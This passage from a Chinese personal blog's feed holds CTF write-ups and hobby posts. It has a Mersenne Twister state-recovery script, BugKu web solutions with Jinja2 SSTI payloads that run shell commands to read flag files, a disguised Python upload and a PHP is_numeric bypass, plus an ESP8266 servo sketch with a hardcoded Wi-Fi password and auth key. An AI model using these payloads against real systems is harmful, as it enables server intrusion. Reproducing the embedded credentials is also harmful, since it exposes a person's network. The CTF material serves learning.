punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span>ciphertext <span class="token operator">=</span> encryption<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> key<span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面的脚本即是对上面脚本所代表的的问题的求解，这里必须要有的参数是生成的624组伪随机数序列，把这个序列放入文件random(下面的脚本给出的文件名)即可。这个之后所有使用<code>getrandbits</code>方式产生的随机数都是不安全的，我们都可以对它进行一个预测。</p><blockquote><p>比如题目先生成了一个30位的随机数，后又生成了一个128位的随机数，那我们只需要按照题目生成随机数的顺序生成预测的随机数，预测的随机数就是跟他生成的随机数是相同的，一点都没变。</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> random <span class="token keyword">import</span> Random<span class="token keyword">def</span> <span class="token function">invert_right</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>l<span class="token punctuation">,</span>val<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    length <span class="token operator">=</span> <span class="token number">32</span>    mx <span class="token operator">=</span> <span class="token number">0xffffffff</span>    <span class="token keyword">if</span> val <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        val <span class="token operator">=</span> mx    i<span class="token punctuation">,</span>res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>    <span class="token keyword">while</span> i<span class="token operator">*</span>l<span class="token operator">&lt;</span>length<span class="token punctuation">:</span>        mask <span class="token operator">=</span> <span class="token punctuation">(</span>mx<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>length<span class="token operator">-</span>l<span class="token punctuation">)</span><span class="token operator">&amp;</span>mx<span class="token punctuation">)</span><span class="token operator">>></span>i<span class="token operator">*</span>l        tmp <span class="token operator">=</span> m <span class="token operator">&amp;</span> mask        m <span class="token operator">=</span> m<span class="token operator">^</span>tmp<span class="token operator">>></span>l<span class="token operator">&amp;</span>val        res <span class="token operator">+=</span> tmp        i <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">invert_left</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>l<span class="token punctuation">,</span>val<span class="token punctuation">)</span><span class="token punctuation">:</span>    length <span class="token operator">=</span> <span class="token number">32</span>    mx <span class="token operator">=</span> <span class="token number">0xffffffff</span>    i<span class="token punctuation">,</span>res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>    <span class="token keyword">while</span> i<span class="token operator">*</span>l <span class="token operator">&lt;</span> length<span class="token punctuation">:</span>        mask <span class="token operator">=</span> <span class="token punctuation">(</span>mx<span class="token operator">>></span><span class="token punctuation">(</span>length<span class="token operator">-</span>l<span class="token punctuation">)</span><span class="token operator">&amp;</span>mx<span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>i<span class="token operator">*</span>l        tmp <span class="token operator">=</span> m <span class="token operator">&amp;</span> mask        m <span class="token operator">^</span><span class="token operator">=</span> tmp<span class="token operator">&lt;&lt;</span>l<span class="token operator">&amp;</span>val        res <span class="token operator">|</span><span class="token operator">=</span> tmp        i <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">invert_temper</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>    m <span class="token operator">=</span> invert_right<span class="token punctuation">(</span>m<span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">)</span>    m <span class="token operator">=</span> invert_left<span class="token punctuation">(</span>m<span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">4022730752</span><span class="token punctuation">)</span>    m <span class="token operator">=</span> invert_left<span class="token punctuation">(</span>m<span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">2636928640</span><span class="token punctuation">)</span>    m <span class="token operator">=</span> invert_right<span class="token punctuation">(</span>m<span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> m<span class="token keyword">def</span> <span class="token function">clone_mt</span><span class="token punctuation">(</span>record<span class="token punctuation">)</span><span class="token punctuation">:</span>    state <span class="token operator">=</span> <span class="token punctuation">[</span>invert_temper<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> record<span class="token punctuation">]</span>    gen <span class="token operator">=</span> Random<span class="token punctuation">(</span><span class="token punctuation">)</span>    gen<span class="token punctuation">.</span>setstate<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token builtin">tuple</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> genf <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"random"</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>prng <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> f<span class="token punctuation">:</span>    i <span class="token operator">=</span> i<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    prng<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>g <span class="token operator">=</span> clone_mt<span class="token punctuation">(</span>prng<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">624</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    g<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>key <span class="token operator">=</span> g<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token comment">#2990136190</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>正则规则总结</title>
      <link href="2021/10/25/%E6%AD%A3%E5%88%99%E8%A7%84%E5%88%99%E6%80%BB%E7%BB%93/"/>
      <url>2021/10/25/%E6%AD%A3%E5%88%99%E8%A7%84%E5%88%99%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="常用正则表达式"><a href="#常用正则表达式" class="headerlink" title="常用正则表达式"></a>常用正则表达式</h2><pre class="line-numbers language-none"><code class="language-none">用户名的正则表达式验证：&#x2F;^[\w\u4e00-\u9fa5]&#123;2,10&#125;&#x2F;g(含汉字)用户名验证：&#x2F;^\w&#123;2,10&#125;$&#x2F;(不含汉字，只允许英文字母、数字和下画线，长度为2-10位)QQ号验证:&#x2F;^[1,9][0,9]&#123;4,19&#125;$&#x2F;（第一位数字不为0，5-19位数字）邮箱验证：&#x2F;^[a-z0-9]+@([a-z0-9]+\.)+[a-z]&#123;2,4&#125;$&#x2F;i(不区分大小写)密码验证：&#x2F;^\w&#123;6,16&#125;$&#x2F;(只允许6-16位英文字母、数字和下画线)手机号验证：&#x2F;^1[3,5,7,8]\d&#123;9&#125;$&#x2F;URL验证：&#x2F;^http:\&#x2F;\&#x2F;[a-z\d-]+(\w\&#x2F;)+)$&#x2F;i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BugKu-Web</title>
      <link href="2021/10/20/BugKu-Web/"/>
      <url>2021/10/20/BugKu-Web/</url>
      
        <content type="html"><![CDATA[<h1 id="前端漏洞"><a href="#前端漏洞" class="headerlink" title="前端漏洞"></a>前端漏洞</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>太简单了，本来不准备写的，但是为了完整还是写上去了。</p><h2 id="F12"><a href="#F12" class="headerlink" title="F12"></a>F12</h2><h3 id="滑稽"><a href="#滑稽" class="headerlink" title="滑稽"></a>滑稽</h3><p><img src="/2021/10/20/BugKu-Web/image-20211020114103929.png" alt></p><p>直接右键检查元素即可看到flag。。。</p><h3 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h3><p>F12修改html标签的maxlength属性，改的长一些即可输入正确答案，答案正确就会弹出来flag。</p><p><img src="/2021/10/20/BugKu-Web/image-20211020114400539.png" alt></p><h2 id="Javascript"><a href="#Javascript" class="headerlink" title="Javascript"></a>Javascript</h2><h3 id="alert"><a href="#alert" class="headerlink" title="alert"></a>alert</h3><p>会无限弹框，这个时候直接使用python的request模块。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsresp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://114.67.246.176:12917/"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>最下面发现注释的html实体字符</p><pre class="line-numbers language-none"><code class="language-none">&lt;!-- &amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#123;&amp;#49;&amp;#51;&amp;#100;&amp;#97;&amp;#53;&amp;#52;&amp;#56;&amp;#98;&amp;#50;&amp;#99;&amp;#101;&amp;#50;&amp;#102;&amp;#52;&amp;#100;&amp;#51;&amp;#97;&amp;#101;&amp;#54;&amp;#100;&amp;#97;&amp;#101;&amp;#54;&amp;#100;&amp;#55;&amp;#48;&amp;#50;&amp;#99;&amp;#57;&amp;#54;&amp;#102;&amp;#49;&amp;#125; --&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在线解码一下</p><pre class="line-numbers language-none"><code class="language-none">在线工具： https:&#x2F;&#x2F;zh.rakko.tools&#x2F;tools&#x2F;21&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/20/BugKu-Web/image-20211020120741392.png" alt></p><h3 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://114.67.246.176:11063/"</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">if</span> <span class="token string">"flag&#123;"</span> <span class="token keyword">in</span> resp<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="服务端模板注入-SSTI"><a href="#服务端模板注入-SSTI" class="headerlink" title="服务端模板注入(SSTI)"></a>服务端模板注入(SSTI)</h1><h2 id="Jinjia2"><a href="#Jinjia2" class="headerlink" title="Jinjia2"></a>Jinjia2</h2><h3 id="Simple-SSTI-1"><a href="#Simple-SSTI-1" class="headerlink" title="Simple_SSTI_1"></a>Simple_SSTI_1</h3><p><img src="/2021/10/20/BugKu-Web/image-20211020000329616.png" alt></p><p>需要传个参数，上面随便传一个参数，给出提示，这个参数名为flag。</p><p>payload</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;114.67.246.176:18833&#x2F;?flag&#x3D;&#123;&#123;config&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/20/BugKu-Web/image-20211020000500344.png" alt></p><h3 id="Simple-SSTI-2"><a href="#Simple-SSTI-2" class="headerlink" title="Simple_SSTI_2"></a>Simple_SSTI_2</h3><p>思路为先看Object下的所有子类，使用以下的payload即可</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?flag&#x3D;&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/20/BugKu-Web/image-20211020001208801.png" alt></p><p>然后再找warningmessage这个类，可以带出来os类</p><p><img src="/2021/10/20/BugKu-Web/image-20211020001353045.png" alt></p><p><img src="/2021/10/20/BugKu-Web/image-20211020001542124.png" alt></p><p><del>看到这个类在第177个位置，然后带出来os。。。</del></p><p>失败，看看别人怎么写的</p><pre class="line-numbers language-none"><code class="language-none">&#123;&#123; config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat .&#x2F;flag&#39;).read() &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>唔，还行，半懂不懂就这样吧，config延展出来的init再globals就有os了。</p><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><h3 id="Flask-FileUpload"><a href="#Flask-FileUpload" class="headerlink" title="Flask_FileUpload"></a>Flask_FileUpload</h3><p>看源码发现注释</p><pre class="line-numbers language-none"><code class="language-none">&lt;!-- Give me the file, and I will return the Running results by python to you! --&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先写一个py文件，内容为</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> osos<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后改后缀名为jpg上传，上传成功之后查看源码即可发现flag。</p><h1 id="php代码审计"><a href="#php代码审计" class="headerlink" title="php代码审计"></a>php代码审计</h1><h2 id="签到类型"><a href="#签到类型" class="headerlink" title="签到类型"></a>签到类型</h2><h3 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$what</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'what'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$what</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$what</span><span class="token operator">==</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">)</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'flag&#123;****&#125;'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?what&#x3D;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$what</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'what'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$what</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$what</span><span class="token operator">==</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">)</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'flag&#123;****&#125;'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><p><img src="/2021/10/20/BugKu-Web/image-20211020115157703.png" alt></p><h2 id="技巧类型"><a href="#技巧类型" class="headerlink" title="技巧类型"></a>技巧类型</h2><h3 id="矛盾-is-numeric漏洞"><a href="#矛盾-is-numeric漏洞" class="headerlink" title="矛盾(is_numeric漏洞)"></a>矛盾(is_numeric漏洞)</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$num</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'flag&#123;**********&#125;'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>is_numeric会将前面是数字，后面是字符的字符串判断为错，然后这个被判断的变量后面的字符会被去掉，所以这里的payload为</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?num&#x3D;1e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MISC常见套路汇总</title>
      <link href="2021/10/16/MISC%E5%B8%B8%E8%A7%81%E5%A5%97%E8%B7%AF%E6%B1%87%E6%80%BB/"/>
      <url>2021/10/16/MISC%E5%B8%B8%E8%A7%81%E5%A5%97%E8%B7%AF%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><h3 id="G语图"><a href="#G语图" class="headerlink" title="G语图"></a>G语图</h3><p><img src="/2021/10/16/MISC%E5%B8%B8%E8%A7%81%E5%A5%97%E8%B7%AF%E6%B1%87%E6%80%BB/image-20211016130220219.png" alt></p><p>大概就是上面的这些字符</p><p><a href="http://grompe.org.ru/static/wingdings_gaster.html">解密网址</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>esp8266和mg90s实现远程舵机控制</title>
      <link href="2021/10/15/esp8266%E5%92%8Cmg90s%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E8%88%B5%E6%9C%BA%E6%8E%A7%E5%88%B6/"/>
      <url>2021/10/15/esp8266%E5%92%8Cmg90s%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E8%88%B5%E6%9C%BA%E6%8E%A7%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在宿舍，经常手动关灯非常的不方便，尤其是在冬天，忘记关灯了的话，谁都懒得下床。如果天气又非常冷的情况下，非常容易把我们冻死，所以就有了远程控制舵机实现关灯的这个想法，下面我们付诸实践。</p><h2 id="硬件准备"><a href="#硬件准备" class="headerlink" title="硬件准备"></a>硬件准备</h2><p>一点杜邦线(某多多6块钱一大把)、MG90S舵机(某多多7块钱一个)、NodeMCU(某多多搜esp8266即可，13块钱左右一个，一般都是集成的有下载器的。)、一台pc(能运行软件的pc即可。。。)</p><h2 id="ESP8266初始化"><a href="#ESP8266初始化" class="headerlink" title="ESP8266初始化"></a>ESP8266初始化</h2><p>先下载驱动，<a href="http://www.wch.cn/downloads/CH341SER_EXE.html">驱动程序CH341SER下载地址</a></p><p><img src="/2021/10/15/esp8266%E5%92%8Cmg90s%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E8%88%B5%E6%9C%BA%E6%8E%A7%E5%88%B6/image-20211015200852663.png" alt></p><p>因为没买杜邦线，这里暂时停止操作，呜呜呜。</p><p><strong>杜邦线到了，继续</strong></p><p><img src="/2021/10/15/esp8266%E5%92%8Cmg90s%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E8%88%B5%E6%9C%BA%E6%8E%A7%E5%88%B6/image-20211018184445837.png" alt></p><p>先下载上面的内容，需要下载android软件，还有如果你还没安装arduino，需要再下载安装一下arduino。</p><h2 id="接线"><a href="#接线" class="headerlink" title="接线"></a>接线</h2><p>接线为MG90S舵机上橙色的线(信号线)接D0口，红线为火线，接3v口，棕色为零线，接G口。</p><blockquote><p>说句题外话<strong>注意：没买杜邦线应该是不行的，现在的舵机接口出来的都是连在一起的母线，非常难受，但是买完杜邦线感觉这样还是挺好的，毕竟如果没连在一起的话，坏了的话不好修理。</strong></p></blockquote><h2 id="Blinker库配置"><a href="#Blinker库配置" class="headerlink" title="Blinker库配置"></a>Blinker库配置</h2><p><img src="/2021/10/15/esp8266%E5%92%8Cmg90s%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E8%88%B5%E6%9C%BA%E6%8E%A7%E5%88%B6/image-20211018191209159.png" alt></p><p><del>解压那个<code>库文件</code>到左侧这个目录即可。</del></p><p>这样好像不行，必须要导入压缩包，在Arduino里面导入，不然会报运行库重复(我深受其害)。</p><h2 id="Arduino-IDE离线安装esp8266-SDK"><a href="#Arduino-IDE离线安装esp8266-SDK" class="headerlink" title="Arduino IDE离线安装esp8266 SDK"></a>Arduino IDE离线安装esp8266 SDK</h2><p><a href="https://www.arduino.cn/thread-76029-1-1.html">https://www.arduino.cn/thread-76029-1-1.html</a></p><p><img src="/2021/10/15/esp8266%E5%92%8Cmg90s%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E8%88%B5%E6%9C%BA%E6%8E%A7%E5%88%B6/image-20211018195110743.png" alt></p><p>先添加这个东西，直接添加<strong>附加开发板管理器网址</strong>之后，搜索开发板库就能搜到ESP8266这个库了。</p><p><img src="/2021/10/15/esp8266%E5%92%8Cmg90s%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E8%88%B5%E6%9C%BA%E6%8E%A7%E5%88%B6/image-20211018195251738.png" alt></p><p>下载esp8266开发板库文件。</p><p><img src="/2021/10/15/esp8266%E5%92%8Cmg90s%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E8%88%B5%E6%9C%BA%E6%8E%A7%E5%88%B6/image-20211018195517654.png" alt></p><p>如果你下载得很慢的话，也许是因为你需要一个vpn来帮帮你。</p><h2 id="arduino程序如下"><a href="#arduino程序如下" class="headerlink" title="arduino程序如下"></a>arduino程序如下</h2><p>先看看<a href="https://wiki.diustou.com/cn/NodeMCU">NodeMCU (CH340)</a>的接口，供你修改你的ino程序</p><p><img src="/2021/10/15/esp8266%E5%92%8Cmg90s%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E8%88%B5%E6%9C%BA%E6%8E%A7%E5%88%B6/image-20211018193132254.png" alt></p><p>这里我看别人有的接的就是D0，我也直接不改了，就接到D0上面了，也就是我们编程时叫的GPIO16。</p><p><strong>代码如下：</strong></p><h3 id="使用点灯科技的按钮的代码"><a href="#使用点灯科技的按钮的代码" class="headerlink" title="使用点灯科技的按钮的代码"></a>使用点灯科技的按钮的代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">BLINKER_WIFI</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">BLINKER_PRINT Serial</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">BLINKER_MIOT_LIGHT</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Blinker.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Servo.h></span></span><span class="token keyword">char</span> auth<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"25835afb24a1"</span><span class="token punctuation">;</span><span class="token keyword">char</span> ssid<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"江枫渔火对愁眠"</span><span class="token punctuation">;</span><span class="token keyword">char</span> pswd<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"20011204"</span><span class="token punctuation">;</span>BlinkerButton <span class="token function">Button1</span><span class="token punctuation">(</span><span class="token string">"ddl1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//blinker按键键名</span>BlinkerButton <span class="token function">Button2</span><span class="token punctuation">(</span><span class="token string">"ddl2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//blinker按键键名</span>Servo servo_16<span class="token punctuation">;</span>   <span class="token comment">//舵机输出口 GIPO16</span>bool oState <span class="token operator">=</span> false<span class="token punctuation">;</span><span class="token comment">//按键1按下后执行该函数</span><span class="token keyword">void</span> <span class="token function">button1_callback</span><span class="token punctuation">(</span><span class="token keyword">const</span> String <span class="token operator">&amp;</span> state<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">BLINKER_LOG</span><span class="token punctuation">(</span><span class="token string">"get button state: "</span><span class="token punctuation">,</span> state<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// digitalWrite(LED_BUILTIN, !digitalRead(LED_BUILTIN));</span>    servo_16<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//舵机旋转角度 具体参数需要结合自身情况修改</span>    <span class="token function">delay</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">//给一个小延时</span>    <span class="token function">delay</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//舵机动作后延时一会回到初始位置</span>    servo_16<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置该角度方便手动开关灯 就是开完灯舵机归位</span><span class="token punctuation">&#125;</span><span class="token comment">//按键2按下执行该函数</span><span class="token keyword">void</span> <span class="token function">button2_callback</span><span class="token punctuation">(</span><span class="token keyword">const</span> String <span class="token operator">&amp;</span> state<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">BLINKER_LOG</span><span class="token punctuation">(</span><span class="token string">"get button state: "</span><span class="token punctuation">,</span> state<span class="token punctuation">)</span><span class="token punctuation">;</span>    servo_16<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token number">135</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//同上一样的思路</span>    <span class="token function">delay</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">delay</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    servo_16<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token comment">//小爱电源回调函数</span><span class="token comment">//里面同样设置舵机的动作</span><span class="token keyword">void</span> <span class="token function">miotPowerState</span><span class="token punctuation">(</span><span class="token keyword">const</span> String <span class="token operator">&amp;</span> state<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">BLINKER_LOG</span><span class="token punctuation">(</span><span class="token string">"need set power state: "</span><span class="token punctuation">,</span> state<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>state <span class="token operator">==</span> BLINKER_CMD_ON<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token comment">// digitalWrite(LED_BUILTIN, HIGH);</span>         servo_16<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token number">45</span>  <span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">delay</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">delay</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         servo_16<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        BlinkerMIOT<span class="token punctuation">.</span><span class="token function">powerState</span><span class="token 